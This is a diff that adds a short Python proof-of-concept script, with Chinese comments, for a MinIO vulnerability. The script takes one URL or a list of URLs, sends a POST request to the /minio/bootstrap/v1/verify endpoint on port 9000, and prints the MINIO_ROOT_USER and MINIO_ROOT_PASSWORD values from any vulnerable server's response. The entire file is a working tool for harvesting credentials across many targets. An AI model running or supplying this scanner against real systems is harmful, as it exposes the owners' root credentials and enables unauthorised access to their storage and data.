@@ -1,0 +1,55 @@
+import requests
+import sys 
+
+
+headers = {"Accept-Encoding": "gzip, deflate","Accept": "*/*","Accept-Language": "en-US;q=0.9,en;q=0.8","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36","Connection": "close","Cache-Control": "max-age=0", "Content-Type": "application/x-www-form-urlencoded"}
+# 从文件中读取 URLs
+urls = []
+def usage():
+    if '-h' in sys.argv:
+        print("""
+-u 指定单个url
+-l 指定文件读取url
+""")
+        return
+    url = None
+    name =None
+    if '-u' in sys.argv:
+        u = sys.argv.index("-u")
+        url = sys.argv[u + 1]
+    if '-l' in sys.argv:
+        l = sys.argv.index("-l")
+        name = sys.argv[l + 1]
+    urls_cl(url,name)
+
+def urls_cl(url="",name=""):
+    if name:
+        with open(name, 'r') as f:
+            for line in f:
+                url = line.strip()
+                urls.append(url)
+    else:
+        urls.append(url)
+    poc()
+def poc():
+# 循环遍历每个 URL
+    for url in urls:
+        burp0_url = f'{url}:9000/minio/bootstrap/v1/verify'
+        # print(burp0_url)
+        try:
+            # 发送 POST 请求
+            res = requests.post(burp0_url, headers=headers)
+            result = res.json()
+            # 检查响应文本
+            if 'MINIO_ROOT_PASSWORD' in res.text and result:
+                print(f"{url}: [+]漏洞存在!")
+                username = result['MinioEnv']['MINIO_ROOT_USER']
+                password = result['MinioEnv']['MINIO_ROOT_PASSWORD']
+                print(f"username:{username},password:{password}")
+            else:
+                print(f"{url}: [-]漏洞不存在")
+        except:
+            print(f'{url}请求超时')
+
+if __name__ == "__main__":
+    usage()
